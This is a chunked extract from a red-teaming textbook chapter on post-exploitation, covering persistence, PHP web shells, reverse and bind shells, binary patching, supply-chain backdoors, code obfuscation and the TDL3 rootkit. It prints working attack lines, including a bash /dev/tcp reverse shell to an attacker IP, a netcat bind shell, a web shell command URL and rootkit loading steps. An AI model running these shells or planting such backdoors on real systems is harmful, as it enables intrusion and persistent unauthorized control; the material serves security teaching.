based on the potential consequences of a successful attack.
Post-exploitation focuses on techniques for maintaining persistent access to
compromised systems, which is a key objective for many attackers. Red
teamers use these techniques to test the effectiveness of endpoint protection,
patch management, and other security controls designed to prevent or detect
### END CHUNK ###

### BEGIN CHUNK ###
# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p208_c188
# SOURCE: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077
# PAGE: 208
# TOKENS: ~320
### CONTENT ###
such persistence. This testing helps organizations strengthen their defenses
against threats that seek to establish a foothold within their networks.
During post-exploitation, red teamers often target credential harvesting and
privilege escalation. These activities are crucial for understanding the
effectiveness of an organization's identity and access management (IAM)
policies. By exploiting these areas, red teamers can reveal weaknesses in
how credentials are stored, managed, and protected, leading to improved
security practices.
Post-exploitation activities allow red teamers to create complex attack
scenarios that involve multiple stages and techniques. These scenarios
provide a more thorough test of an organization's security posture than
simple penetration testing. They can uncover vulnerabilities that may only
be exposed through a series of chained exploits, thus offering deeper
insights into potential security weaknesses.
Improving Blue Team Capabilities
A focus on post-exploitation helps the blue team (defensive security team)
improve their detection and response capabilities. By analyzing the
techniques and tactics used by the red team during post-exploitation, the
blue team can enhance their threat hunting, monitoring, and incident
response processes.
### END CHUNK ###

### BEGIN CHUNK ###
# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p209_c189
# SOURCE: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077
# PAGE: 209
# TOKENS: ~227
### CONTENT ###
The computer security incident response teams (CSIRTs) and chief
information security officers (CISOs) of many organizations operate under
the presumption that they have already been breached, rather than focusing
solely on preventing intrusions (this is what we call the “assume
compromise mentality”). In this way, they prioritize continuous monitoring,
detection, and response capabilities, acknowledging that even with robust
preventive controls, sophisticated attackers may still find ways to penetrate
the network. By adopting this mindset, defensive security teams can better
allocate resources toward understanding attacker behavior post-exploitation,
improving incident response capabilities, and implementing stronger
detection mechanisms—ultimately creating a more resilient security
posture.
Figure 6-1 shows how lessons learned from post-exploitation activities by
the red team help the blue team.
### END CHUNK ###

### BEGIN CHUNK ###
# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p211_c190
# SOURCE: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077
# PAGE: 211
# TOKENS: ~350
### CONTENT ###
Post-exploitation activities often involve techniques that bypass signature-
based detection systems. Blue teams learn to focus on behavioral analysis to
identify anomalies in user activities, network traffic, and system processes.
Exposure to sophisticated post-exploitation tactics encourages blue teams to
deploy and fine-tune advanced monitoring tools, such as security
information and event management (SIEM) systems, endpoint detection and
response (EDR) solutions, extended detection and response (XDR), and
network detection and response (NDR) tools.
Exploring XDRs
XDR systems represent the evolution of traditional security solutions by
providing a unified, holistic approach to threat detection and response. In
the past, we ran siloed security tools that operate independently. XDR
integrates data from multiple sources including endpoints, networks, cloud
workloads, email systems, and identity management platforms. The power
of XDR lies in its ability to automatically correlate and analyze security
events across different security layers, providing context-rich alerts that
help security teams understand the full scope of potential threats. XDR
platforms can automatically identify and respond to security incidents,
significantly reducing the time from detection to remediation. This
capability is something to keep in mind when performing red team and
ethical hacking engagements.
### END CHUNK ###

### BEGIN CHUNK ###

XDR platforms are increasingly leveraging artificial intelligence and
machine learning capabilities to enhance their threat detection and response
capabilities beyond traditional rule-based approaches. Modern AI-powered
XDR solutions can analyze security data in real time, identifying subtle
patterns and anomalies that might indicate sophisticated attacks, while also
learning from new threats to continuously improve their detection accuracy.
These AI capabilities enable XDR platforms to provide predictive threat
detection and automate complex response workflows.
By understanding the specific techniques used in post-exploitation, blue
teams can better leverage threat intelligence to correlate indicators of
compromise (IOCs) with ongoing activities, enhancing their ability to
detect similar patterns in real time. Blue teams can develop threat-hunting
hypotheses based on the post-exploitation tactics observed during red team
engagements. This proactive approach involves searching for signs of
adversary behavior that might have evaded initial detection.
Post-exploitation activities align with various tactics and techniques in the
MITRE ATT&CK framework. Blue teams can use this framework to map
out adversary behaviors and identify gaps in their defenses.
Observing post-exploitation scenarios helps blue teams identify weaknesses
in their incident response plans. They can update and refine these plans to
ensure a more effective and coordinated response to real-world incidents.

Blue teams can develop detailed playbooks for specific post-exploitation
activities, such as lateral movement, privilege escalation, and data
exfiltration. These playbooks provide step-by-step guidance on how to
detect, contain, and remediate these activities.
Incorporating post-exploitation scenarios into tabletop exercises helps blue
teams practice and improve their response to complex attacks. These
exercises simulate real-world conditions, enabling teams to identify and
address gaps in their response process. Blue teams can enhance endpoint
security measures by understanding how red teams achieve persistence and
evade detection. This effort might involve implementing stricter access
controls, better patch management, and more robust endpoint protection
configurations.
Post-exploitation activities often involve lateral movement within a
network. Blue teams can use insights from these activities to implement or
improve network segmentation and microsegmentation, limiting an
attacker’s ability to move freely within the environment. Red team activities
that focus on privilege escalation highlight the importance of managing
privileged accounts effectively.

(PAM) solutions to strengthen security around the use of privileged
accounts. PAM refers to a comprehensive set of policies, practices, and
tools designed to manage and secure the access of privileged users to

By deploying PAM solutions, you can control and monitor privileged

vaulting, just-in-time (JIT) access, and least privilege enforcement. These
best practices help reduce the risk of unauthorized access, human error,
insider threats, and external attacks while making sure that only authorized
users have access to sensitive resources (and only for the duration
necessary). PAM tools also provide detailed audit logs and reports, enabling
teams to track and respond to suspicious activities effectively. As a red

understanding and addressing Privileged Access Management (PAM) is
crucial because PAM solutions are specifically designed to thwart the
techniques you rely on to escalate privileges and move laterally within a
target environment. Most PAM solutions make it significantly harder to
exploit misconfigurations or default credentials for privilege escalation.
They provide session monitoring and recording for privileged users. If you
compromise a privileged account and attempt to access sensitive systems,
your actions may be logged and reviewed, increasing the likelihood of
detection during or after your engagement.

Post-exploitation activities often leave traces in system logs. Blue teams can

activities are continuously integrated into defensive capabilities.
How to Maintain Access, Use Persistence Mechanisms, and
Create Backdoors
Using persistence mechanisms and creating backdoors are important
components of post-exploitation activities. They enable you (an ethical
hacker) to maintain access to compromised systems over an extended
period, often without detection. Let’s explore different types of backdoors,
### END CHUNK ###

Post-Exploitation and Living-off-the-Land Case Study
Volt Typhoon and Salt Typhoon are two highly sophisticated cyber
espionage groups linked to China, each employing advanced techniques to
infiltrate critical infrastructure and telecommunications networks. Their
operations are notable for their stealth, persistence, and the potential for
significant geopolitical impact.
Volt Typhoon avoids traditional malware by using built-in system tools like
PowerShell and Windows Management Instrumentation (WMI) to blend
into legitimate network activity. This is also known as living off the land
(LOTL). You will learn more about LOTL later in this chapter. LOTL makes
detection extremely difficult because it does not leave behind typical
malware signatures. Salt Typhoon targets core network infrastructure,
including routers and network management systems, using LOTL
techniques similar to Volt Typhoon.
Types of Backdoors
Application-level backdoors are malicious modifications or additions to
legitimate applications that allow unauthorized access to a system or

Web Shells
Web shells are scripts that allow attackers to execute arbitrary commands
on a web server. They are typically written in scripting languages like PHP,
ASP, JavaScript, or JSP. Figure 6-2 illustrates how web shells work.
### END CHUNK ###

### BEGIN CHUNK ###

Figure 6-2 How Web Shells Work
In Figure 6-2, the attacker identifies a vulnerability in the frontend
application, such as an insecure file upload or a code injection point, and
uses it to upload a web shell script. For example, the attacker might exploit
a file upload vulnerability to upload a PHP web shell script to the server.
### END CHUNK ###

### BEGIN CHUNK ###
# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p220_c199
# SOURCE: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077
# PAGE: 220
# TOKENS: ~301
### CONTENT ###
The uploaded web shell script is stored on the backend server, making it
persistent. This allows the attacker to access it at any time. For instance, the
web shell script is saved in the web server's directory, such as
/var/www/html/shell.php.
The attacker accesses the web shell by navigating to the URL where it is
hosted and passing commands through the URL parameters or HTTP
requests. It accesses the web shell via http://secretcorp.org/shell.php?
cmd=whoami to execute the whoami command on the server.
The backdoor interprets the received command and executes it on the
backend application. The execution results are captured by the backdoor.
The web shell script executes the whoami command on the backend server
and captures the output, such as the username under which the web server is
running. The results of the executed command are sent back from the
backend application to the backdoor script. The backdoor forwards the
command results through the frontend application back to the attacker. The
attacker receives the results and can issue further commands as needed.
A simple PHP web shell might look like the one in Example 6-1.
Example 6-1 Web Shell in PHP
<?php
if(isset($_GET['cmd'])) {

To use these web shells, you would deploy the respective script on a
vulnerable web server and then access them via a web browser or an HTTP
client, passing the desired command as a query string parameter.
You can obscure the actual commands or code within a web shell by
manipulating strings or using indirect references. You can use string
rotations and segmentation by breaking up strings into smaller parts or
rotating characters to make them unreadable without reconstruction.
### END CHUNK ###

### BEGIN CHUNK ###
# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p224_c203
# SOURCE: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077

# TOKENS: ~369
### CONTENT ###
You can also convert commands into their hexadecimal equivalents, making
the code harder to read at first glance. For example, the command
system('cat /etc/passwd'); could be encoded as
73797374656d2827636174202f6574632f70617373776427293b13.
Stripping out whitespace from code to make it more difficult to read and
analyze can also be used for obfuscation.
Compression techniques and tools like gzdeflate() can be used to reduce the
size of the web shell's code while also making it less readable. The
compressed code is decompressed at runtime, allowing the attacker to hide
large portions of their script until it is executed. Another technique is
embedding malicious code within legitimate files (e.g., index.php), making
it harder for defenders to distinguish between normal and malicious activity.
You can also configure web shells to respond only when specific HTTP
headers are present in the request. It can be a custom header or a standard
one like Authorization, which is checked before allowing access to the web
shell. For example, a web shell might require a specific header (such as X-
Access-Token) with a predefined value. If the header is missing or
incorrect, the server could return a 404 error or another innocuous response,
making it harder for unauthorized users or security scanners to detect the
web shell.
For example, you can set up a rule where the web shell responds only if an
additional header like X-Auth: secretkey123 is included in the request.
### END CHUNK ###

Additional Web Shell Examples at SecLists
SecLists is a comprehensive repository of various types of lists used by
security professionals during security assessments and penetration testing. It
serves as an essential companion for security testers, providing a wide
range of data sets that are critical for various testing and assessment
activities. The project is designed to be a one-stop resource where testers
can find all the necessary lists in one place, enabling them to efficiently
perform their tasks without having to gather these lists from multiple
sources. You can access web shells from SecLists at
https://github.com/danielmiessler/SecLists/tree/master/Web-Shells
However, SecLists include other useful wordlists such as
• Usernames and Passwords: They are used for brute-force attacks,
dictionary attacks, and password spraying to test the strength of
authentication mechanisms.
• URLs: They are used for discovering hidden directories, files, and
endpoints on web servers. They include lists of common web directories
like /admin, /login, /backup, and potential filenames that might be exposed
on a server.
### END CHUNK ###

### BEGIN CHUNK ###
# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p226_c205
# SOURCE: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077
# PAGE: 226
# TOKENS: ~332
### CONTENT ###
• Sensitive Data Patterns: These patterns help in identifying sensitive
information such as credit card numbers, Social Security numbers, and
other personally identifiable information (PII) during scans and audits. They
include regular expressions for matching credit card numbers, Social
Security numbers, email addresses, and other sensitive data formats.
• Fuzzing Payloads: They are used for input fuzzing to discover
vulnerabilities by providing unexpected inputs to applications. For example,
wordlists of payloads that test for SQL injection, cross-site scripting (XSS),
buffer overflow, and other injection attacks.
• Other Wordlists: They are used for many types of password cracking,
including offline attacks against hashed passwords and online attacks
against authentication mechanisms. These are wordlists containing common
words, phrases, and combinations that might be used in passwords.
Modified Applications and Hidden Functionalities in Legitimate
Software
Attackers can modify legitimate applications to include backdoor
functionalities by altering the application's source code or binary files.
These modifications can be made to both open-source and proprietary
software, making them difficult to detect and dangerous once deployed. In
open-source software, attackers download the source code from repositories
### END CHUNK ###

### BEGIN CHUNK ###
# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p227_c206

like GitHub or GitLab and modify them. In proprietary software, they
obtain the binary files through reverse engineering or insider threats.
To inject malicious code, modify the source code to include backdoor
capabilities. For binary files, use tools like a hex editor or binary patching
tools to alter the executable. For source code, recompile the application to
produce a modified executable. For binary modifications, repack the binary
to ensure it runs smoothly. You can distribute the modified application
through official channels, phishing, or social engineering. The backdoor can
be activated upon a specific trigger, such as opening the application or
performing a specific action within the application.

void save_file(char *filename, char lines[MAX_LINES][
num_lines) {
 FILE *file = fopen(filename, "w");
 if (!file) {
 perror("Could not save file");
 return;
 }
 for (int i = 0; i < num_lines; i++) {
 fputs(lines[i], file);
 }
 fclose(file);
 printf("File saved successfully.\n");
}

 filename[strcspn(filename, "\n")] = '\0';
 save_file(filename, lines, num_lines);
 break;
 case 4:
 printf("Exiting...\n");
 return 0;
 default:
 printf("Invalid choice. Please try again.
 }
 }

Reverse Shells vs. Bind Shells
In the previous examples, we explored reverse shells, but what exactly are
they? How are they different from bind shells? Reverse shell and bind shell
are common methods used by attackers to gain remote control over a
compromised machine. Both have distinct characteristics and use cases.
A reverse shell is a type of shell where the target machine initiates a
connection to the attacker's machine. This connection reversal allows the
attacker to bypass certain network security measures, such as firewalls that
block incoming connections but allow outgoing ones.
Figure 6-3 illustrates how a reverse shell works.
### END CHUNK ###

### BEGIN CHUNK ###
# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p233_c212
# SOURCE: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077
# PAGE: 233
# TOKENS: ~150
### CONTENT ###
Figure 6-3 How a Reverse Shell Works
In Figure 6-3, the attacker sets up a listener on their own machine
(10.1.2.3), waiting for incoming connections on a specified port (1337). The
target machine, once compromised, runs a script or command that connects
back to the attacker's machine, effectively opening a shell on the target that
the attacker can control.
The following is an example of using Netcat on the attacker's machine
(listening on port 1337):
nc -lvp 1337
In the target system, the following bash command can be executed to
establish a reverse shell:
bash -i >& /dev/tcp/10.1.2.3/1337 0>&1
### END CHUNK ###

### BEGIN CHUNK ###
# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p234_c213
# SOURCE: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077
# PAGE: 234
# TOKENS: ~196
### CONTENT ###
Reverse shells can often bypass firewalls and NAT configurations that block
incoming connections. Outbound connections are typically less suspicious
and harder to detect than inbound ones.
A bind shell is a type of shell where the target machine opens a specific port
and listens for incoming connections. The attacker then connects to this port
to gain control of the shell on the target machine.
Figure 6-4 illustrates how bind shells work.
Figure 6-4 How a Bind Shell Works
In Figure 6-4, the compromised system opens a port (1337) and binds a
shell to it, waiting for incoming connections. The attacker connects to the
open port on the target machine to control the shell.
The following is an example of using the Netcat command in the
compromised system for a bind shell command:
### END CHUNK ###

### BEGIN CHUNK ###

nc -lvp 1337 -e /bin/bash
You can also use Netcat in the attacker's system to connect to the bind shell:
nc target_ip 1337

An advantage of bind shells is that they are easier to implement because the
target (compromised) system only needs to listen for connections. However,
one of the disadvantages is that bind shells are more likely to be blocked by
firewalls and network security devices that prevent incoming connections.
They are also more noticeable to network monitoring tools due to the open
port on the target machine.
Table 6-2 provides a high-level comparison of reverse and bind shells.
Table 6-2 Comparison of Reverse and Bind Shells
Both reverse shells and bind shells are excellent techniques in the toolkit of
penetration testers and red teamers. Reverse shells are typically preferred
due to their ability to bypass firewalls and NAT configurations, making
them more stealthy and effective in various network environments. Bind
shells, while simpler to set up, are more likely to be blocked by network
### END CHUNK ###

defenses and are more visible to network monitoring. Understanding both
techniques is essential for both offensive and defensive security
professionals.

and control (C2) framework used primarily for post-

environment for managing compromised systems across

design. Operators can easily install and customize agents
(payloads) and C2 profiles (communication channels)
through a plug-and-play architecture. This flexibility makes
Mythic highly valuable for long-term operations where
stealth and adaptability are required. Once a target system is
compromised, Mythic allows operators to interact with the

Patching Binaries to Include a Backdoor
You can load an executable file into a hex editor to find an appropriate
injection point and create a backdoor. You also can locate a section of the
binary where you can inject code without disrupting the original
functionality. Additionally, you can inject machine code for the reverse shell
or backdoor.
The following is an oversimplified example of the original binary section
(hex):
55 48 89 E5 48 83 EC 10 48 8B 05 B8 13 20 00

The backdoor can be designed to activate when the application starts or
upon a specific user action. For instance, the reverse shell could be initiated
when the user opens a specific menu item or document. Some of these
backdoors can be challenging to detect, especially if the modifications are
subtle and well hidden. Understanding these techniques is crucial for
defenders to implement proper security measures, such as code reviews,
binary analysis, and behavior monitoring, to identify and mitigate such
threats.
Supply Chain Backdoors
A supply chain backdoor refers to a malicious modification of a software
application or library at some point in its development or distribution
process, often unbeknownst to the end users. You can embed a backdoor in
an open-source project by adding extra code that checks for specific triggers
or commands. This type of attack leverages the trust that users place in
legitimate software providers, aiming to insert malicious code into software
that is widely distributed and used. One particularly insidious method is
embedding a backdoor in an open-source project by adding extra code that
checks for specific triggers or commands.
Attackers gain access to the source code repository of an open-source
project. This could be accomplished through compromising developer
### END CHUNK ###

### BEGIN CHUNK ###
# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p249_c225

# TOKENS: ~333
### CONTENT ###
accounts (stealing credentials) or exploiting vulnerabilities in the accounts
of trusted developers or maintainers, or taking advantage of security flaws
in the version control systems or repository hosting services.
The attacker subtly adds malicious code to the project. This code is
designed to avoid detection during code reviews and automated security
checks. The backdoor code often includes conditions or inputs that activate
the malicious functionality only when certain criteria are met, reducing the
chance of detection. The attacker can also use code obfuscation or
encryption to hide the true purpose of the backdoor.
Avoiding Detection Using Code Obfuscation
Code obfuscation is a technique used to make source code or machine code
difficult to understand. Attackers commonly employ this practice to hide
malicious code, such as backdoors, from security analysts, automated
analysis tools, and other detection mechanisms. The primary goal is to
prevent the code from being easily read, analyzed, or reverse-engineered,
thus reducing the likelihood of detection.
Let’s go over some of the most common code obfuscation techniques. Some
attackers change the names of variables, functions, and classes to
meaningless or misleading names. Example 6-11 shows our original code.
Example 6-11 Renaming Obfuscation Original Code

Another technique is to use code inlining and unrolling. The attacker
replaces function calls with the actual function code (inlining) and loops
with repeated code blocks (unrolling).

In Example 6-16 the function and variable names have been changed to
meaningless sequences (a1b2c3, x1x2x3, y1y2y3, d1d2d3). The IP address
and port number are encoded in hexadecimal format to hide their true
values. The code maintains consistent formatting to avoid raising suspicion
during superficial reviews.
Several popular tools can be used for code obfuscation:
• ProGuard: Tool used for Java applications, primarily Android apps
• PyArmor: Tool used for Python scripts
• obfuscator.io: Online tool used for obfuscating JavaScript code

• UPX (Ultimate Packer for Executables): Tool used to pack and

Tip
Code obfuscation is a powerful technique to make malicious
code, such as backdoors, difficult to detect and analyze. By
renaming variables, altering control flow, encoding data, and
inserting dead code, attackers can significantly hinder the
efforts of security analysts and automated tools in identifying
and understanding the malicious functionality. However, it's
important to note that while obfuscation can delay detection,
dedicated and skilled analysts with the right tools and
techniques can still uncover obfuscated code.
System-Level Backdoors
System-level backdoors provide deep and persistent access to a
compromised system, often with elevated privileges. You can create
system-level backdoors by using techniques such as
• Trojanized System Binaries: Replacing legitimate system binaries with
malicious versions. For example, you can replace the legitimate /bin/ls
command on a Linux system with a malicious version that logs user
activity. These modified binaries perform their expected tasks but also
### END CHUNK ###

Kernel-Level Backdoors
Rootkits are malicious software that operate at the kernel level, giving
attackers deep access to the system. They can intercept and modify system
calls, hide their presence, and provide attackers with control over the
system. The following are the types of rootkits:
• User Mode Rootkits: Operate at the application layer, modifying user-
space applications and APIs
• Kernel Mode Rootkits: Operate at the kernel level, modifying kernel data
structures and functions
### END CHUNK ###

### BEGIN CHUNK ###

# PAGE: 262
# TOKENS: ~187
### CONTENT ###
• Hypervisor Rootkits: Operate below the operating system, modifying the
hypervisor to control virtual machines
• Firmware Rootkits: Operate within the firmware of hardware devices,
such as network cards and BIOS

Once you compile the rootkit, load it. In other words, load the kernel
module:
sudo insmod rootkit.ko
Then check if the rootkit is loaded and hidden:
lsmod | grep rootkit
Running this command should show nothing if the rootkit is hidden
correctly.
Let’s go over a real-world use case of a sophisticated rootkit known as
TDL3 (also referred to as TDSS or Alureon). This rootkit is known for its
ability to operate at the kernel level, providing deep system access and
significant stealth capabilities. The TDL3 loader is responsible for loading
and initiating the rootkit's malicious payload while evading detection from
traditional security mechanisms. The following are the key characteristics
of the TDL3 loader:
### END CHUNK ###

### BEGIN CHUNK ###
# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p265_c241
# SOURCE: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077
# PAGE: 265
# TOKENS: ~276
### CONTENT ###
• Kernel-Level Operation: The TDL3 loader operates at the kernel level,
allowing it to manipulate core system functions and remain hidden from
most user-space security tools.
• Bootkit Capabilities: TDL3 can infect the master boot record (MBR) or
the volume boot record (VBR), ensuring its persistence across system
reboots.
• Code Injection: It injects its code into legitimate system processes,
making it difficult to detect and remove.
• Stealth Techniques: The TDL3 loader utilizes advanced techniques to
hide its presence, including rootkit capabilities to intercept and alter system
calls.
The TDL3 rootkit is typically delivered via drive-by downloads, infected
email attachments, or malicious websites. Once it is executed, the installer
modifies the MBR or VBR to load the TDL3 loader during the system boot
process.
The original MBR/VBR is modified to include a small piece of code that
redirects the boot process to the TDL3 loader. During system startup, the
modified MBR/VBR code executes the TDL3 loader. The TDL3 loader
initializes and loads the main components of the rootkit into memory.
### END CHUNK ###

### BEGIN CHUNK ###
# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p266_c242

# PAGE: 266
# TOKENS: ~198
### CONTENT ###
The loader installs hooks into the operating system's kernel, allowing it to
intercept system calls and manipulate them to hide its presence and
maintain control over the system. After establishing itself in the kernel, the
loader activates the rootkit's payload, which can include various malicious
activities such as keystroke logging, data exfiltration, and the installation of
additional malware.

Tip
This method of infecting executables in the PE format,
which is the primary format for Windows executables and
dynamic link libraries (DLLs), is typical for virus infectors
but less common for rootkits. The PE header and the section
table are essential components of any PE file. The PE header
contains critical information about the locations of code and
data, system metadata, stack size, and so on, while the
section table provides details about the executable's sections
and their locations.
To complete the infection, the malware overwrites the .NET
metadata directory entry in the PE header with the values
from the security data directory entry. This change is likely
intended to hinder static analysis of the infected files,
### END CHUNK ###

### BEGIN CHUNK ###
# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p271_c245

# TOKENS: ~309
### CONTENT ###
potentially causing errors when common malware analysis
tools parse the PE header. For instance, attempts to load such
infected files caused IDA Pro version 5.6 to crash, a bug that
has since been fixed. According to Microsoft's PE/COFF
specification, the .NET metadata directory contains data
used by the Common Language Runtime (CLR) to load and
run .NET applications. However, this directory entry is
irrelevant for kernel-mode boot drivers because they are
native binaries without system-managed code. Consequently,
this directory entry isn’t checked by the OS loader, allowing
an infected driver to load successfully even if its content is
invalid.
It is important to note that this TDL3 infection technique has
limitations: it works only on 32-bit platforms due to
Microsoft's Kernel-Mode Code Signing Policy, which
mandates code integrity checks on 64-bit systems. Since the
driver's content is altered during infection, its digital
signature becomes invalid, preventing the OS from loading
the driver on 64-bit systems. The malware developers
responded to this limitation with TDL4.
Bootkits are a type of malware that infects the master boot record (MBR) or
Unified Extensible Firmware Interface (UEFI), allowing the malware to
### END CHUNK ###

# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p272_c246
